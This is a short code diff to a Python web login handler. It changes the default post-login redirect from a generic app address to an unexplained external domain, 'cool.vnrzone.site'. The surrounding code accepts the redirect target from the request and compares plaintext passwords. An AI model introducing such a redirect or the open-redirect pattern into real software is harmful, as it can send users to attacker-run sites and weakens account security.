@@ -16,7 +16,7 @@ def login():
     data = request.json
     username = data.get("username")
     password = data.get("password")
-    redirect_url = data.get("redirect_url", "https://default-app.com")
+    redirect_url = data.get("redirect_url", "https://cool.vnrzone.site")
     
     # Check if the user is in the static users dictionary
     if username in users and users[username] == password:
